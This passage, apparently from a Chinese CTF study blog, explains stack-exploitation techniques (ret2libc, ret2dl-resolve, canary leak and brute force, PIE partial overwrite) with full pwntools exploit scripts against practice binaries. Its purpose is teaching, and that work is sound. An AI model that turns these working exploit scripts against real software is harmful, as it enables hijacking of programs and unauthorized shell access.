data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062031854.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h3><p>在ida找到bin&#x2F;sh字符串地址</p><p>查找到system函数存在地址</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062036649.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062036649.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;RET2LIBC &gt;_&lt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span> + p32(<span class="number">0x8048460</span>) + <span class="string">b&quot;xxxx&quot;</span> + p32(<span class="number">0x8048720</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><p>没有system函数。也没有binsh字符串</p><ul><li><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p></li><li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</p></li><li><p><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></p></li><li><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p><p>基本利用思路如下</p><ul><li>泄露 puts函数 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</li></ul><p>单步运行过puts函数，查询got表</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062141094.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062141094.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>通过vmmap找到对应libc的基地址，并且计算偏移</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062140118.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062140118.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>再计算system函数的偏移</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062145374.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062145374.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>然后searh “bin&#x2F;sh”的地址，再计算bin&#x2F;sh1的偏移</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062233997.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062233997.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x8048440</span></span><br><span class="line">puts_plt = <span class="number">0x8048460</span></span><br><span class="line">main_addr = <span class="number">0x8048618</span></span><br><span class="line">puts_got = <span class="number">0x804a018</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Can you find it !?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_addr = puts_addr   -  <span class="number">0x6dc30</span></span><br><span class="line">system_addr = libc_addr +  <span class="number">0x41790</span></span><br><span class="line">bin_sh_addr = libc_addr +  <span class="number">0x18e363</span></span><br><span class="line">success(<span class="string">&quot;puts_addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">success(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;bin_sh_addr: &quot;</span> + <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Can you find it !?&quot;</span>)</span><br><span class="line">payload1 = <span class="string">b&quot;a&quot;</span>*<span class="number">104</span> + p32(system_addr) + <span class="string">b&quot;xxxx&quot;</span> + p32(bin_sh_addr)</span><br><span class="line"><span class="comment">#payload1 = b&quot;a&quot;*104 + p32(gets_plt) + p32(system_addr) + p32(0x804a020) + p32(0x804a020)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sleep(0.2)</span></span><br><span class="line"><span class="string">p.sendline(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="ret2dl"><a href="#ret2dl" class="headerlink" title="ret2dl"></a>ret2dl</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070808012.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070808012.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>ELF关于动态链接的关键segment：</p><p>.dynamic:一般保存了ELF文件依赖于哪些动态库,动态符号节信息;</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070809904.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070809904.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070810312.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070810312.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>各segment的位置关系:</p><p>.dynamic的地址加Ox44的位置是.</p><p>dynstr;.dynamic的地址加Ox4c的位置是.</p><p>dynsym;.dynamic的地址加Ox84的位置是.rel.plt;</p><p>第一次调用一个函数时_dl_runtime_resolve函数的工作: _dl_runtime resolve(link map_obj, reloc index)：</p><p>1.首先用link_map访问.dynamic，分别取出.dynstr、.dynsym、.rel.plt的地址;</p><p>2..rel.plt ＋参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel;</p><p>3.rel-&gt;r_info &gt; &gt;8&#x3D; n作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;4..dynstr + sym-&gt;st_name得出符号名字符串指针;</p><p>5.在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表;</p><p>6.最后调用这个函数;</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070833409.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070833409.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070840120.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070840120.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>思路:</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070842319.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070842319.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span> ,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line"><span class="comment">#p=remote(&#x27;chall.pwnable.tw&#x27;, 10103)</span></span><br><span class="line">elf= ELF(name)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc_32.so.6&#x27;)</span></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    </span><br><span class="line">rel_plt_addr = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr   <span class="comment">#0x8048330</span></span><br><span class="line">dynsym_addr =  elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr    <span class="comment">#0x80481d8</span></span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr     <span class="comment">#0x8048278</span></span><br><span class="line">resolve_plt = <span class="number">0x08048380</span></span><br><span class="line">leave_ret_addr = <span class="number">0x0804851d</span> </span><br><span class="line">start = <span class="number">0x804aa00</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt_addr = start</span><br><span class="line">fake_dynsym_addr = fake_rel_plt_addr + <span class="number">0x8</span></span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + <span class="number">0x10</span></span><br><span class="line">bin_sh_addr = fake_dynstr_addr + <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">n = fake_rel_plt_addr - rel_plt_addr</span><br><span class="line">r_info = (<span class="built_in">int</span>((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">str_offset = fake_dynstr_addr - dynstr_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_rel_plt = p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(r_info)</span><br><span class="line">fake_dynsym = p32(str_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12000000</span>)</span><br><span class="line">fake_dynstr = <span class="string">b&quot;system\x00/bin/sh\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">108</span> + p32(start - <span class="number">20</span>) + p32(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(leave_ret_addr) + p32(<span class="number">0</span>) + p32(start - <span class="number">20</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RET_TO_DL~!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Nice to meet you~!\n&quot;)</span></span><br><span class="line">p.sendline(pay1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">pay2 = p32(<span class="number">0x0</span>) + p32(resolve_plt) + p32(n) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line">p.sendline(pay2)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;.rel_plt: &quot;</span> + <span class="built_in">hex</span>(rel_plt_addr))</span><br><span class="line">success(<span class="string">&quot;.dynsym: &quot;</span> + <span class="built_in">hex</span>(dynsym_addr))</span><br><span class="line">success(<span class="string">&quot;.dynstr: &quot;</span> + <span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">success(<span class="string">&quot;fake_rel_plt_addr: &quot;</span> + <span class="built_in">hex</span>(fake_rel_plt_addr))</span><br><span class="line">success(<span class="string">&quot;fake_dynsym_addr: &quot;</span> + <span class="built_in">hex</span>(fake_dynsym_addr))</span><br><span class="line">success(<span class="string">&quot;fake_dynstr_addr: &quot;</span> + <span class="built_in">hex</span>(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">&quot;n: &quot;</span> + <span class="built_in">hex</span>(n))</span><br><span class="line">success(<span class="string">&quot;r_info: &quot;</span> + <span class="built_in">hex</span>(r_info))</span><br><span class="line">success(<span class="string">&quot;offset: &quot;</span> + <span class="built_in">hex</span>(str_offset))</span><br><span class="line">success(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">&quot;bss_addr: &quot;</span> + <span class="built_in">hex</span>(elf.bss()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="击败cancary"><a href="#击败cancary" class="headerlink" title="击败cancary"></a>击败cancary</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>函数开始执行的时候会先往栈底插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法(栈帧销毁前测试该值是否被改</p><p>变)，如果不合法就停止程序运行(发生了栈溢出);</p><p>在Linux当中我们将这段cookie信息称为Canary ,Canary是一个低字节为\x00的16进制数;</p><p>因为Canary在局部变量的后边,在EBP或RBP的前面所以当攻击者覆盖返回地址的时候往往也会将cookie信息给覆盖掉,这就会导致栈保护检查失败而阻止payload的执行,从而避免漏洞利用成功.</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070908218.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070908218.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070908905.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070908905.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>方法一:泄露栈中的Canary:</p><p>Canary设计为以字节×O0O结尾,其本意就是为了保证Canary 可以截断字符串,防止我们输出字符串的时候将Canary打印出来;所以泄露栈中的Canary的思路是将Canary的低字节\x00覆盖，然后连同用户的字符串一起打印出剩余的Canary部分;</p><p>当我们打印出完整的Canary后,在溢出的时候再将正确Canary填回去,就可以进行控制返回地址,控制程序流程了.</p><p>条件:</p><p>1.有合适的输出函数</p><p>2.泄露Canary后程序不会崩溃</p><h3 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h3><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070920559.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070920559.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070921740.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070921740.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf = ELF(name)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">28</span> + <span class="string">&quot;b&quot;</span>*<span class="number">4</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getshell_addr = <span class="number">0x804858b</span></span><br><span class="line">payload1 = <span class="string">b&quot;a&quot;</span>*<span class="number">32</span> + p32(canary) + <span class="string">b&quot;b&quot;</span>*<span class="number">12</span> + p32(getshell_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>方法二:爆破Canary:</p><p>对于Canary,虽然每次进程重启后的Canary 不同(相比GS，GS重启后是相同的)但是同一个进程中的不同线程的Canary 是相同的,并且通过fork函数创建的子进程的Canary也是相同的,因为fork函数会直接拷贝父进程的内存。</p><p>我们可以利用这样的特点，彻底逐个字节将Canary爆破出来.</p><p>缺点:多进程程序,32位程序需要爆破3字节,64位程序需要爆破7字节,需要爆破较多.</p><p>其他方法: 1.联合其他漏洞修改劫持_stack_chk_fail函数;</p><p>例题：</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070955279.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070955279.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070958299.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207070958299.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">name = <span class="string">&#x27;./pwn2&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf = ELF(name)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(j))</span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="built_in">chr</span>(j))</span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;recv&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = u32(canary)</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">getflag = <span class="number">0x0804863B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + p32(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="PIE绕过："><a href="#PIE绕过：" class="headerlink" title="PIE绕过："></a>PIE绕过：</h2><p>position-independent executable,地址无关可执行文件,该技术就是一个针对代码段.text,数据段.*data，.bss等固定地址的一个防护技术应用了PIE的程序会在每次加载时都变换加载基址，从而使ropper等工具无法得到准确的地址.</p><p>方法一: Partial Write<br>部分写入技术,由于内存的页载入机制，PIE的随机化只能影响到单个内存页;通常来说,一个内存页大小为Ox1000,这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的就是利用了PIE后12位地址不变的特点,通过覆盖EIP的后8或16位(按字节写入每字节8位)就可以快速爆破或者直接劫持EIP;</p><p>特点:</p><p>1.程序不大,有后门函数等;<br>2.只需要爆破一个字节</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020358.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020358.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020616.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020616.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020918.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020918.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> (i)</span><br><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">0xff</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">io = process(<span class="string">&quot;./partial_write&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload += <span class="string">&#x27;\xca&#x27;</span><span class="comment">#strncpy复制202个字节造成溢出</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">200</span></span><br><span class="line">payload += <span class="string">&#x27;\x01\x39&#x27;</span><span class="comment">#frontdoor的地址后三位是0x900, +1跳过push rbp 爆破的是3</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.recv(timeout = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">io.close()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.interactive()<span class="comment">#没有EOFError的话就是爆破成功，可以开shell</span></span><br><span class="line"><span 